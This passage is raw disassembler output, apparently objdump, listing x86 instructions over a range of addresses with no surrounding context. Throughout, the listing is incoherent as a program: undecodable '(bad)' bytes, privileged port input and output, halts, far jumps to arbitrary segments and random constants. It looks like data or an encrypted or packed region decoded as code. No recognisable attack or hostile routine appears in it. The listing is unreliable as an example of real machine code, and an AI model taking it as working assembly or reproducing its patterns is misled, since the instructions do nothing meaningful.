  409794:	cmp    DWORD PTR [ebx-0x6a],0xc52ebb24
  40979b:	ss daa 
  40979d:	pop    ds
  40979e:	add    al,0x58
  4097a0:	xor    edx,DWORD PTR [ecx]
  4097a2:	mov    al,0x5b
  4097a4:	(bad)  
  4097a5:	push   esp
  4097a6:	sbb    ecx,DWORD PTR [ebp-0x2c]
  4097a9:	or     ecx,0xb147ba92
  4097af:	xchg   esp,eax
  4097b0:	pop    es
  4097b1:	fnsave [ebx-0x21484955]
  4097b7:	mov    dh,0x1d
  4097b9:	push   ebp
  4097ba:	cmp    al,0x51
  4097bc:	ret    
  4097bd:	xor    esp,edx
  4097bf:	xor    BYTE PTR [bp-0x6f],cl
  4097c3:	inc    ecx
  4097c4:	jo     0x409815
  4097c6:	lahf   
  4097c7:	jae    0x40980e
  4097c9:	sar    BYTE PTR [edx],0x65
  4097cc:	clc    
  4097cd:	mov    WORD PTR [eax],ss
  4097cf:	in     al,dx
  4097d0:	stos   DWORD PTR es:[edi],eax
  4097d1:	push   ss
  4097d2:	cmp    al,0x1f
  4097d4:	mov    ecx,0x2b65136f
  4097d9:	lods   eax,DWORD PTR ds:[esi]
  4097da:	sub    eax,0xee01afb0
  4097df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097e0:	pop    es
  4097e1:	push   0x9fc35fc
  4097e6:	ds in  al,dx
  4097e8:	es popf 
  4097ea:	and    edi,eax
  4097ec:	cmp    al,0xd
  4097ee:	mov    eax,DWORD PTR [eax+0x52]
  4097f1:	iret   
  4097f2:	out    dx,eax
  4097f3:	dec    esp
  4097f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097f5:	pop    edi
  4097f6:	retf   0x81bc
  4097f9:	mov    bl,ah
  4097fb:	ds xor ch,cl
  4097fe:	push   edx
  4097ff:	and    DWORD PTR [ecx-0x9],ebp
  409802:	inc    esp
  409803:	jg     0x40980c
  409805:	ins    DWORD PTR es:[edi],dx
  409806:	rcl    edi,0x51
  409809:	test   DWORD PTR [edx+0x7a],ebp
  40980c:	std    
  40980d:	adc    DWORD PTR [eax+0x33],eax
  409810:	cmp    al,0x2b
  409812:	mov    dl,bh
  409814:	cdq    
  409815:	jae    0x409814
  409817:	shr    BYTE PTR [edx],1
  409819:	cmc    
  40981a:	fiadd  DWORD PTR [edx]
  40981c:	push   edi
  40981d:	push   es
  40981e:	adc    esp,DWORD PTR [edi+0x706032dd]
  409824:	out    0x6,al
  409826:	and    eax,0x8b6b49a2
  40982b:	lea    ebx,ds:0x3a9fdf30
  409831:	xor    al,0xfd
  409833:	push   es
  409834:	scas   eax,DWORD PTR es:[edi]
  409835:	cwde   
  409836:	xchg   ecx,eax
  409837:	jb     0x409848
  409839:	in     al,dx
  40983a:	in     eax,0x29
  40983c:	push   eax
  40983d:	icebp  
  40983e:	xchg   ebp,eax
  40983f:	out    0x65,eax
  409841:	(bad)  
  409843:	fnsave [ebx-0x1b1e43f0]
  409849:	push   0x1a
  40984b:	dec    edi
  40984c:	adc    al,0x57
  40984e:	xor    al,0x3d
  409850:	test   bl,al
  409852:	popa   
  409853:	(bad)  
  409854:	mov    eax,ds:0xe19e631
  409859:	test   eax,esi
  40985b:	or     edx,ebp
  40985d:	dec    ebx
  40985e:	dec    esi
  40985f:	add    al,0x16
  409861:	out    0x12,al
  409863:	mov    WORD PTR [esi],?
  409865:	and    DWORD PTR [edx+0x227ce4df],ebp
  40986b:	jnp    0x40983f
  40986d:	imul   edi,DWORD PTR [esi+0x3e],0x30
  409871:	aaa    
  409872:	data16 adc ch,BYTE PTR [edi]
  409875:	xchg   ecx,eax
  409876:	mov    bh,0x8e
  409878:	(bad)  
  409879:	or     cl,BYTE PTR [edx]
  40987b:	push   cs
  40987c:	xchg   ebx,eax
  40987d:	retf   
  40987e:	sbb    dh,BYTE PTR [ecx+esi*8]
  409881:	push   eax
  409882:	rcr    edi,cl
  409884:	clc    
  409885:	dec    ebx
  409886:	test   DWORD PTR [edx],esp
  409888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409889:	xchg   edi,eax
  40988a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40988b:	fwait
  40988c:	mov    esi,0x60d4ba59
  409891:	mov    dh,ah
  409893:	out    0xbd,eax
  409895:	popa   
  409896:	push   ecx
  409897:	or     al,0xaa
  409899:	and    DWORD PTR es:[edi-0x55],eax
  40989d:	xchg   ecx,eax
  40989e:	icebp  
  40989f:	mov    ds:0x34203b2,eax
  4098a4:	outs   dx,BYTE PTR ds:[esi]
  4098a5:	mov    ecx,0xb3f84d61
  4098aa:	sub    DWORD PTR [ecx+eax*8-0x30],edx
  4098ae:	clc    
  4098af:	fs push cs
  4098b1:	jmp    0x7f57:0x8f87489a
  4098b8:	cmp    DWORD PTR [ebp-0x55],edx
  4098bb:	xor    al,0xd4
  4098bd:	xor    cl,BYTE PTR [di]
  4098c0:	push   ds
  4098c1:	hlt    
  4098c2:	jnp    0x4098c5
  4098c4:	mov    esp,?
  4098c6:	cmp    eax,0x4ea61130
  4098cb:	dec    ebx
  4098cc:	cmp    ah,BYTE PTR [eax+0x4d]
  4098cf:	add    al,0xc5
  4098d1:	stc    
  4098d2:	and    edx,ebx
  4098d4:	mov    bh,0x37
  4098d6:	out    dx,al
  4098d7:	sbb    al,0x52
  4098d9:	jnp    0x4098b0
  4098db:	inc    esp
  4098dc:	sbb    al,0x7f
  4098de:	and    eax,esi
  4098e0:	ins    DWORD PTR es:[edi],dx
  4098e1:	call   0x2e:0x58c89b63
  4098e8:	clc    
  4098e9:	and    edx,ebp
  4098eb:	jno    0x409874
  4098ed:	dec    edx
  4098ee:	jecxz  0x40994a
  4098f0:	pop    es
  4098f1:	test   eax,0x18884602
  4098f6:	jo     0x409884
  4098f8:	and    dl,BYTE PTR [edx+edx*2+0x5e]
  4098fc:	or     eax,0x9dfc0fb
  409901:	xchg   esp,eax
  409902:	push   es
  409903:	pop    ebp
  409904:	test   al,0xb5
  409906:	aad    0xab
  409908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409909:	ds ja  0x40995b
  40990c:	into   
  40990d:	dec    ebp
  40990e:	sub    BYTE PTR [eax-0x14],ch
  409911:	retf   0x3cc6
  409914:	hlt    
  409915:	sar    dh,1
  409917:	sti    
  409918:	mov    WORD PTR [eax],fs
  40991a:	add    bl,BYTE PTR [eax-0x28399fea]
  409920:	cli    
  409921:	mov    BYTE PTR [esi],bl
  409923:	inc    eax
  409924:	ret    
  409925:	or     dl,bh
  409927:	sub    eax,DWORD PTR [ebx-0x76bd79d]
  40992d:	cs scas eax,DWORD PTR es:[edi]
  40992f:	push   ss
  409930:	in     al,dx
  409931:	xor    ah,BYTE PTR [edx]
  409933:	loopne 0x409960
  409935:	es popa 
  409937:	push   ds
  409938:	xchg   ebx,eax
  409939:	sub    al,0x3
  40993b:	stos   BYTE PTR es:[edi],al
  40993c:	push   ds
  40993d:	jg     0x4098fd
  40993f:	adc    dl,BYTE PTR [edx-0x4b4bfb36]
  409945:	into   
  409946:	mov    ch,0x6a
  409948:	sub    edx,0xf88d9f81
  40994e:	sti    
  40994f:	sbb    BYTE PTR [ecx+ebx*2+0x1e571c8e],bl
  409956:	sbb    DWORD PTR [edx-0x3d],edx
  409959:	out    dx,al
  40995a:	ds fdivp st(1),st
  40995d:	sbb    dl,cl
  40995f:	mov    edi,0xd272b5b7
  409964:	test   BYTE PTR [ebx-0x6f],cl
  409967:	adc    ebx,0x2c
  40996a:	push   0x12
  40996c:	daa    
  40996d:	xchg   edx,eax
  40996e:	cmp    al,0x8c
  409970:	shr    BYTE PTR [esi+0xceebe68],1
  409976:	xchg   esi,eax
  409977:	retf   
  409978:	xor    DWORD PTR [ebx],ebp
  40997a:	mulps  xmm6,XMMWORD PTR [edx-0x9]
  40997e:	push   dx
  409980:	xchg   DWORD PTR ds:0xde6aad40,ecx
  409986:	les    esp,FWORD PTR [eax]
  409988:	mov    ah,0xaf
  40998a:	mov    DWORD PTR [ecx+0x14984793],esp
  409990:	dec    esp
  409991:	inc    eax
  409992:	stos   BYTE PTR es:[edi],al
  409993:	loop   0x409948
  409995:	push   0xffffff93
  409997:	jnp    0x409952
  409999:	fldcw  WORD PTR [esi-0x340c6ea6]
  40999f:	add    DWORD PTR [eax+0x2f40e70],esp
  4099a5:	icebp  
  4099a6:	das    
  4099a7:	repnz out dx,al
  4099a9:	ror    WORD PTR [esi],1
  4099ac:	pop    ebp
  4099ad:	add    BYTE PTR [edx-0x23],bl
  4099b0:	adc    ch,BYTE PTR [eax-0x28]
  4099b3:	mov    bl,0x5e
  4099b5:	add    dh,BYTE PTR [edx+0x16]
  4099b8:	mov    ds:0x3f7486d2,eax
  4099bd:	cmp    esp,ebp
  4099bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099c0:	dec    eax
  4099c1:	icebp  
  4099c2:	xor    al,0xdf
  4099c4:	inc    ebp
  4099c5:	test   eax,0x7378d23c
  4099ca:	pusha  
  4099cb:	sbb    eax,0x61580bc4
  4099d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099d1:	sbb    BYTE PTR [edx+0x2c9ea28a],bh
  4099d7:	mov    edi,0xa06ebc62
  4099dc:	mov    DWORD PTR [ebx+0x555c5287],esp
  4099e2:	or     eax,DWORD PTR [ebp-0x47924ec2]
  4099e8:	cmp    esp,DWORD PTR [ebx]
  4099ea:	inc    esp
  4099eb:	push   ss
  4099ec:	mov    bl,0x5e
  4099ee:	popa   
  4099ef:	inc    ebp
  4099f0:	mov    ch,0x38
  4099f2:	jbe    0x409a06
  4099f4:	test   DWORD PTR [edx+0x50],edi
  4099f7:	dec    ebp
  4099f8:	jbe    0x4099cd
  4099fa:	loopne 0x4099c0
  4099fc:	adc    DWORD PTR [ebp+0x26],edx
  4099ff:	imul   esp,DWORD PTR [ebp-0x25],0xc13fcc01
  409a06:	sub    eax,0x4b5d5c7d
  409a0b:	arpl   WORD PTR cs:[edi],sp
  409a0e:	dec    eax
  409a0f:	pop    ecx
  409a10:	fcom   QWORD PTR [ecx]
  409a12:	sahf   
  409a13:	or     eax,0xdd79c0ca
  409a18:	fimul  DWORD PTR [edi-0x10cfdf88]
  409a1e:	cs pop edx
  409a20:	push   ds
  409a21:	hlt    
  409a22:	add    dl,BYTE PTR [edx-0x9]
  409a25:	push   ebx
  409a26:	out    0xdb,al
  409a28:	push   eax
  409a29:	jns    0x4099f3
  409a2b:	dec    ebp
  409a2c:	out    0x75,al
  409a2e:	imul   edx,ebx,0x1c54ec3b
  409a34:	pop    es
  409a35:	add    dl,bl
  409a37:	pop    ss
  409a38:	mov    eax,0x1597b34d
  409a3d:	lods   al,BYTE PTR ds:[esi]
  409a3e:	fidivr WORD PTR [edx-0x1c4b58c4]
  409a44:	xor    BYTE PTR cs:[eax],al
  409a47:	stos   DWORD PTR es:[edi],eax
  409a48:	and    BYTE PTR [esp+eax*8],0xa1
  409a4c:	out    dx,eax
  409a4d:	aam    0x7c
  409a4f:	call   0x1eb0:0x2cb4eda
  409a56:	mov    gs,WORD PTR [ecx+0x5a]
  409a59:	in     al,0x66
  409a5b:	loope  0x409aac
  409a5d:	push   cs
  409a5e:	mov    dh,0xb4
  409a60:	pop    eax
  409a61:	in     eax,0x3f
  409a63:	push   0x53
  409a65:	mov    dh,0xd0
  409a67:	outs   dx,DWORD PTR ds:[esi]
  409a68:	movsx  esi,WORD PTR [ebp-0x52cde5e9]
  409a6f:	cmp    al,0x5c
  409a71:	or     eax,0xae414e3
  409a76:	leave  
  409a77:	sub    bl,BYTE PTR fs:[eax]
  409a7a:	pop    esp
  409a7b:	inc    ebp
  409a7c:	ss data16 jge 0x409aea
  409a80:	sbb    eax,0x1b5f23fe
  409a85:	je     0x409a6d
  409a87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a88:	into   
  409a89:	push   cs
  409a8a:	das    
  409a8b:	rcl    ebp,1
  409a8d:	shr    BYTE PTR [ebx+0x7e6513fb],cl
  409a93:	xor    eax,DWORD PTR [esi]
  409a95:	adc    eax,DWORD PTR [ebx+eax*8]
  409a98:	out    dx,al
  409a99:	sub    edi,DWORD PTR [edi+0x5f]
  409a9c:	dec    eax
  409a9d:	add    esi,DWORD PTR [edx]
  409a9f:	out    0xe0,eax
  409aa1:	hlt    
  409aa2:	mov    dl,0xb6
  409aa4:	jns    0x409b1c
  409aa6:	je     0x409a8b
  409aa8:	les    edx,FWORD PTR [ebp-0x26b1b8fa]
  409aae:	xchg   esi,eax
  409aaf:	nop
  409ab0:	aas    
  409ab1:	add    bl,ah
  409ab3:	or     esi,DWORD PTR [ecx]
  409ab5:	jb     0x409b14
  409ab7:	lea    esp,[ebp+0x34]
  409aba:	inc    ebp
  409abb:	pop    es
  409abc:	dec    ecx
  409abd:	jno    0x409abc
  409abf:	or     eax,0xce853d7a
  409ac4:	sub    bh,dl
  409ac6:	fs sub edi,DWORD PTR es:[edx]
  409aca:	mov    ecx,0x64ed59a4
  409acf:	aad    0x91
  409ad1:	jb     0x409b06
  409ad3:	(bad)  
  409ad4:	cmp    esp,DWORD PTR ds:0xc7358918
  409ada:	jle    0x409b3c
  409adc:	inc    edx
  409add:	pop    ss
  409ade:	push   ebp
  409adf:	fdiv   QWORD PTR ds:0x2adf8b7b
  409ae5:	aaa    
  409ae6:	pop    edi
  409ae7:	adc    ch,BYTE PTR [eax-0x4c]
  409aea:	in     eax,0xe
  409aec:	xchg   ebx,eax
  409aed:	or     al,0x8d
  409aef:	dec    ebx
  409af0:	mov    bh,0xd0
  409af2:	pop    ecx
  409af3:	add    esp,DWORD PTR [esi-0x1903601c]
  409af9:	cmp    DWORD PTR [edx],0x28d6229
  409aff:	sub    eax,0xe6be3032
  409b04:	ds xchg ebx,eax
  409b06:	adc    eax,0xa45906bd
  409b0b:	daa    
  409b0c:	not    BYTE PTR [edx+ebp*1+0x61]
  409b10:	xor    eax,0x3d2c5f8d
  409b15:	retf   
  409b16:	in     al,dx
  409b17:	push   edx
  409b18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b19:	jmp    0x9f95f4b4
  409b1e:	xchg   BYTE PTR [ecx],dh
  409b20:	test   BYTE PTR [ecx+0x54f71233],dl
  409b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b27:	push   ebp
  409b28:	mov    ecx,0xff9aac5e
  409b2d:	add    edi,edi
  409b2f:	or     BYTE PTR [edi],bl
  409b31:	fbld   TBYTE PTR [edx+0x69]
  409b34:	gs std 
  409b36:	into   
  409b37:	mov    eax,ds:0x8aa0db0b
  409b3c:	and    eax,DWORD PTR [edx+esi*8+0x29]
  409b40:	jl     0x409b7b
  409b42:	call   0x91770ba4
  409b47:	not    BYTE PTR [ebp+0x1f]
  409b4a:	or     ebp,DWORD PTR [edx-0x636e89e2]
  409b50:	jl     0x409bcc
  409b52:	addr16 icebp 
  409b54:	adc    al,0x40
  409b56:	cmp    eax,0xff3333bd
  409b5b:	or     BYTE PTR [eax+edx*8],ah
  409b5e:	dec    ebx
  409b5f:	ja     0x409bc4
  409b61:	xchg   ebx,eax
  409b62:	out    0xdd,eax
  409b64:	jae    0x409b27
  409b66:	out    dx,eax
  409b67:	xchg   esp,eax
  409b68:	lock mov ch,0xb8
  409b6b:	popa   
  409b6c:	fadd   DWORD PTR [esi-0x1b]
  409b6f:	inc    ebp
  409b70:	in     al,0xc8
  409b72:	xchg   ebx,eax
  409b73:	sti    
  409b74:	jbe    0x409b4e
  409b76:	test   al,0x54
  409b78:	push   ds
  409b79:	dec    ecx
  409b7a:	dec    ebp
  409b7b:	and    ebx,DWORD PTR [eax+0x46]
  409b7e:	rol    BYTE PTR [edx-0x273d6abf],cl
  409b84:	out    0x29,al
  409b86:	mov    al,0x45
  409b88:	mov    eax,DWORD PTR [ecx+edi*4]
  409b8b:	vmread DWORD PTR [ebx],ebx
  409b8e:	ins    DWORD PTR es:[edi],dx
  409b8f:	mov    bh,0x8d
  409b91:	adc    al,0xf
  409b93:	cmp    BYTE PTR [ecx],al
  409b95:	add    BYTE PTR [ecx+ebx*4],cl
  409b98:	mov    edx,0x17593699
  409b9d:	out    0xe7,al
  409b9f:	mov    edx,0x8acb3972
  409ba4:	push   es
  409ba5:	or     esi,esi
  409ba7:	cld    
  409ba8:	loope  0x409b70
  409baa:	xchg   edi,eax
  409bab:	jae    0x409c09
  409bad:	ret    
  409bae:	jp     0x409b7a
  409bb0:	adc    esi,edx
  409bb2:	pop    esp
  409bb3:	in     al,dx
  409bb4:	int    0x2f
  409bb6:	sbb    ah,dh
  409bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bb9:	adc    BYTE PTR [ebp-0x6025a272],bh
  409bbf:	retf   0xdc
  409bc2:	pop    eax
  409bc3:	cmp    edx,DWORD PTR [edx]
  409bc5:	(bad)  
  409bc6:	jne    0x409b88
  409bc8:	jns    0x409c2d
  409bca:	lahf   
  409bcb:	sbb    DWORD PTR [edx+0x57],0xffffff87
  409bcf:	and    ebx,0xffffffc4
  409bd2:	popa   
  409bd3:	shl    BYTE PTR [esi-0xbaaf15f],0x3e
  409bda:	sti    
  409bdb:	xor    DWORD PTR [ebx],ecx
  409bdd:	gs mov dl,bh
  409be0:	adc    al,0xc7
  409be2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409be3:	inc    ebx
  409be4:	out    0xe2,eax
  409be6:	push   eax
  409be7:	ds xchg ecx,eax
  409be9:	pop    ds
  409bea:	mov    BYTE PTR [edx+0x527c29],0x20
  409bf1:	je     0x409bb7
  409bf3:	pushf  
  409bf4:	pop    eax
  409bf5:	xchg   edi,eax
  409bf6:	ret    0x8dd7
  409bf9:	jmp    DWORD PTR [ecx-0x3306cae6]
  409bff:	mov    dl,0x56
  409c01:	inc    ebp
  409c02:	lea    edi,[edx+0x20]
  409c05:	inc    esp
  409c06:	int    0xce
  409c08:	daa    
  409c09:	mov    cl,0x54
  409c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c0c:	cwde   
  409c0d:	inc    ebp
  409c0e:	push   ss
  409c0f:	mov    al,0xd6
  409c11:	leave  
  409c12:	jnp    0x409be7
  409c14:	mov    ah,0x66
  409c16:	in     eax,0x2f
  409c18:	pop    ebp
  409c19:	popf   
  409c1a:	out    0xd7,al
  409c1c:	hlt    
  409c1d:	imul   BYTE PTR [edi]
  409c1f:	iret   
  409c20:	fiadd  DWORD PTR [eax]
  409c22:	imul   ecx,DWORD PTR [eax+eax*2-0x53],0x53c72b9
  409c2a:	dec    eax
  409c2b:	sbb    esp,DWORD PTR [edi-0x28]
  409c2e:	push   0x4b
  409c30:	push   ss
  409c31:	xor    esp,DWORD PTR [edx+0x247e1d33]
  409c37:	pop    esi
  409c38:	jns    0x409bcb
  409c3a:	mov    cl,0x75
  409c3c:	arpl   WORD PTR [ebx+0x7],bx
  409c3f:	(bad)  
  409c40:	cdq    
  409c41:	scas   eax,DWORD PTR es:[edi]
  409c42:	push   ecx
  409c43:	push   edx
  409c44:	sbb    ebp,DWORD PTR [ebx+0x43]
  409c47:	stc    
  409c48:	in     al,0x86
  409c4a:	mov    eax,ds:0xce85c00
  409c4f:	cmp    ch,BYTE PTR [esi+0x42e9f129]
  409c55:	adc    DWORD PTR [eax-0x6b26b1cd],edx
  409c5b:	add    eax,0x73d85671
  409c60:	add    BYTE PTR [eax-0x6a72dcd5],ah
  409c66:	or     BYTE PTR [ebp+edx*4+0x52],0x50
  409c6b:	fstp   TBYTE PTR [ecx+0x3b]
  409c6e:	inc    eax
  409c6f:	sbb    DWORD PTR [edx-0x63688be],0x3c
  409c76:	aad    0x62
  409c78:	push   es
  409c79:	mov    ecx,0x76e1a0da
  409c7e:	push   ebx
  409c7f:	push   ebp
  409c80:	mov    al,ds:0xc2280a70
  409c85:	cmp    dl,al
  409c87:	or     BYTE PTR cs:[edx+0x60],bh
  409c8b:	call   0x5cc3501a
  409c90:	(bad)  
  409c91:	mov    DWORD PTR [esi],edx
  409c93:	aaa    
  409c94:	jle    0x409ca7
  409c96:	lock out 0x1b,eax
  409c99:	jb     0x409c53
  409c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c9c:	xchg   DWORD PTR [ecx],ebx
  409c9e:	sub    ecx,ecx
  409ca0:	aaa    
  409ca1:	xor    al,BYTE PTR [eax]
  409ca3:	bound  eax,QWORD PTR [edx+0x5]
  409ca6:	sbb    BYTE PTR [esi-0x4d7cb47e],0x86
  409cad:	pop    ss
  409cae:	loope  0x409c38
  409cb0:	sti    
  409cb1:	mov    ds:0xe07d358,al
  409cb6:	push   edi
  409cb7:	pop    ebx
  409cb8:	jecxz  0x409cb7
  409cba:	add    al,0x28
  409cbc:	pop    edi
  409cbd:	shl    BYTE PTR [edx+eax*4-0x3b80a1f8],cl
  409cc4:	sbb    eax,0xd178ca32
  409cc9:	cmp    eax,0xea926b10
  409cce:	or     ebp,edx
  409cd0:	repz fcomp DWORD PTR [esi+0x4eab7e27]
  409cd7:	cwde   
  409cd8:	in     al,0x25
  409cda:	out    0xda,eax
  409cdc:	or     al,al
  409cde:	aas    
  409cdf:	mov    ah,0x9
  409ce1:	push   edx
  409ce2:	cmp    DWORD PTR [edi],0xffffffd0
  409ce5:	push   ecx
  409ce6:	rcr    edx,cl
  409ce8:	xchg   esp,eax
  409ce9:	adc    bl,BYTE PTR [ecx+0x23]
  409cec:	sbb    DWORD PTR [ecx+0x48121afe],ebp
  409cf2:	inc    edx
  409cf3:	cmp    DWORD PTR [ebx+0x17],esi
  409cf6:	inc    ecx
  409cf7:	sub    eax,0xed050a04
  409cfc:	sbb    edx,DWORD PTR [ecx]
  409cfe:	and    al,0xba
  409d00:	pop    esi
  409d01:	xchg   ecx,eax
  409d02:	pop    es
  409d03:	add    ebx,edx
  409d05:	enter  0x1134,0x2b
  409d09:	scas   eax,DWORD PTR es:[edi]
  409d0a:	push   eax
  409d0b:	sub    al,0xec
  409d0d:	(bad)  [edi]
  409d0f:	or     dl,BYTE PTR [esi+0x66]
  409d12:	xor    dl,BYTE PTR [esi]
  409d14:	pop    ebx
  409d15:	mov    bh,0xf0
  409d17:	push   ebp
  409d18:	pop    es
  409d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d1a:	in     eax,0xf5
  409d1c:	cmp    DWORD PTR [eax+0x6db433b5],0xfffffffa
  409d23:	(bad)  
  409d24:	adc    ah,BYTE PTR [ebp+0x69]
  409d27:	push   0xe967bef0
  409d2c:	repz sbb eax,0x9960bc69
  409d32:	cli    
  409d33:	ret    0x4f97
  409d36:	xchg   esp,eax
  409d37:	leave  
  409d38:	pop    ecx
  409d39:	pop    edx
  409d3a:	push   es
  409d3b:	pushf  
  409d3c:	aaa    
  409d3d:	sbb    dl,bl
  409d3f:	(bad)
  409d42:	sbb    al,cl
  409d44:	mov    edx,0xeedeccd2
  409d49:	jne    0x409d64
  409d4b:	rcl    edi,0x59
  409d4e:	mov    WORD PTR [ecx+edi*2],es
  409d51:	popf   
  409d52:	outs   dx,BYTE PTR ds:[esi]
  409d53:	sar    ch,1
  409d55:	push   cs
  409d56:	call   0xf75c2e2
  409d5b:	sub    edx,eax
  409d5d:	jno    0x409ce9
  409d5f:	cwde   
  409d60:	xor    BYTE PTR [edi-0x66eac9bf],ah
  409d66:	mov    al,0xa9
  409d68:	cmp    esi,esi
  409d6a:	popa   
  409d6b:	and    eax,0x2c297815
  409d70:	sbb    al,0x7c
  409d72:	test   eax,0x3cecc578
  409d77:	push   eax
  409d78:	in     eax,0x7d
  409d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d7b:	xor    eax,0x8443bec6
  409d80:	gs add al,0x36
  409d83:	sub    BYTE PTR [ebp+0x5164763e],bh
  409d89:	push   ds
  409d8a:	fwait
  409d8b:	aad    0x72
  409d8d:	push   ss
  409d8e:	mov    bh,0x59
  409d90:	fcom   DWORD PTR [esp+edx*1+0x6c]
  409d94:	mul    BYTE PTR [ebp+0x24]
  409d97:	sar    ecx,cl
  409d99:	jl     0x409e11
  409d9b:	add    eax,0x127f7d29
  409da0:	dec    edx
  409da1:	cs std 
  409da3:	fld    QWORD PTR [edx-0x47]
  409da6:	dec    esi
  409da7:	stos   BYTE PTR es:[edi],al
  409da8:	aas    
  409da9:	xchg   esp,eax
  409daa:	pop    edx
  409dab:	and    ch,BYTE PTR gs:[eax-0x28]
  409daf:	ret    0x1bf6
  409db2:	into   
  409db3:	pushf  
  409db4:	test   al,0x67
  409db6:	test   bh,0xdf
  409db9:	push   es
  409dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dbb:	aad    0xac
  409dbd:	dec    ebp
  409dbe:	dec    edx
  409dbf:	dec    edx
  409dc0:	cmp    eax,0x5673acde
  409dc5:	and    al,0x62
  409dc7:	repz sbb edi,DWORD PTR [ecx+0x3]
  409dcb:	fwait
  409dcc:	les    eax,FWORD PTR [edx]
  409dce:	es xchg ecx,eax
  409dd0:	xchg   DWORD PTR [ebp+0x44],ebp
  409dd3:	jle    0x409e2e
  409dd5:	pop    es
  409dd6:	data16 shl BYTE PTR [edi],0x3d
  409dda:	xchg   edx,eax
  409ddb:	pop    edi
  409ddc:	fwait
  409ddd:	xlat   BYTE PTR ds:[ebx]
  409dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ddf:	int    0x79
  409de1:	(bad)  
  409de2:	mov    edx,0x28709539
  409de7:	sar    BYTE PTR [ebx-0x4e1aeda1],1
  409ded:	mov    edx,DWORD PTR ds:0xb232531d
  409df3:	dec    edx
  409df4:	(bad)  
  409df5:	inc    edx
  409df6:	loopne 0x409e2f
  409df8:	xor    dl,BYTE PTR [eax]
  409dfa:	mov    ah,0xa0
  409dfc:	cld    
  409dfd:	xor    dh,cl
  409dff:	int    0x8e
  409e01:	push   ds
  409e02:	xchg   ebp,eax
  409e03:	push   esi
  409e04:	pop    es
  409e05:	sbb    al,0x9a
  409e07:	dec    ebx
  409e08:	cld    
  409e09:	lfs    edi,FWORD PTR [ebx+0x6]
  409e0d:	cmp    ah,dh
  409e0f:	aam    0x21
  409e11:	ja     0x409db7
  409e13:	imul   esi,DWORD PTR [esi-0x288ea4a0],0x1248933
  409e1d:	aad    0x2a
  409e1f:	loop   0x409e10
  409e21:	ja     0x409e1c
  409e23:	mov    bl,0xc5
  409e25:	shr    ebp,0x87
  409e28:	mov    bh,0x7f
  409e2a:	push   ebx
  409e2b:	jb     0x409e8c
  409e2d:	js     0x409e83
  409e2f:	(bad)  
  409e30:	pop    ds
  409e31:	(bad)  [esi]
  409e33:	mov    dl,0xcb
  409e35:	jmp    0x409ea8
  409e37:	or     al,0xaf
  409e39:	cmp    al,0xf5
  409e3b:	mov    ah,0xe9
  409e3d:	js     0x409e91
  409e3f:	ds dec ebp
  409e41:	adc    bl,0xac
  409e44:	aam    0x7e
  409e46:	push   ebp
  409e47:	ret    
  409e48:	in     eax,dx
  409e49:	pop    es
  409e4a:	inc    esi
  409e4b:	xchg   DWORD PTR [edx],ebx
  409e4d:	sub    DWORD PTR [ecx],esi
  409e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e50:	sbb    eax,0x960ba054
  409e55:	xchg   esi,eax
  409e56:	push   0xffffffe2
  409e58:	pop    ecx
  409e59:	add    ebx,esp
  409e5b:	jmp    0x409ebb
  409e5d:	das    
  409e5e:	(bad)  
  409e61:	inc    ebx
  409e62:	jg     0x409eb2
  409e64:	xchg   edx,eax
  409e65:	daa    
  409e66:	inc    ebp
  409e67:	das    
  409e68:	lock sub al,0xb0
  409e6b:	cld    
  409e6c:	test   eax,0xd98e0708
  409e71:	add    al,0x14
  409e73:	add    esp,DWORD PTR [eax+0x491d2684]
  409e79:	inc    edi
  409e7a:	add    ebp,eax
  409e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e7d:	mov    edx,0xd365361f
  409e82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e83:	xor    ecx,0x2b71fa9e
  409e89:	and    BYTE PTR [edx+0x3b],al
  409e8c:	and    eax,0x16084301
  409e91:	lock pop ebp
  409e93:	ja     0x409eb1
  409e95:	cs call 0x4c5c:0xcf9643d2
  409e9d:	dec    ebx
  409e9e:	retf   
  409e9f:	mov    ebx,0xb661919d
  409ea4:	in     eax,dx
  409ea5:	add    BYTE PTR [esp+edi*4],0xbf
  409ea9:	ja     0x409ea6
  409eab:	pop    edi
  409eac:	xchg   DWORD PTR [edi-0x3da65bb4],edx
  409eb2:	jl     0x409e3e
  409eb4:	enter  0x615a,0x7a
  409eb8:	daa    
  409eb9:	dec    ebp
  409eba:	dec    edi
  409ebb:	fwait
  409ebc:	scas   al,BYTE PTR es:[edi]
  409ebd:	(bad)  
  409ebe:	ret    0x3ac6
  409ec1:	pushf  
  409ec2:	out    dx,eax
  409ec3:	push   ds
  409ec4:	fild   WORD PTR [edx]
  409ec6:	push   ds
  409ec7:	mov    ds:0x513183de,eax
  409ecc:	rol    ebx,1
  409ece:	repz pop ss
  409ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ed1:	cli    
  409ed2:	call   0xaa0f:0xb007537c
  409ed9:	loopne 0x409f48
  409edb:	int    0xea
  409edd:	mov    ebp,0xec7c2d41
  409ee2:	bound  esi,QWORD PTR [edi]
  409ee4:	ffreep st(0)
  409ee6:	retf   0x1f72
  409ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eea:	mov    BYTE PTR [edx+eax*8-0x557f8f82],al
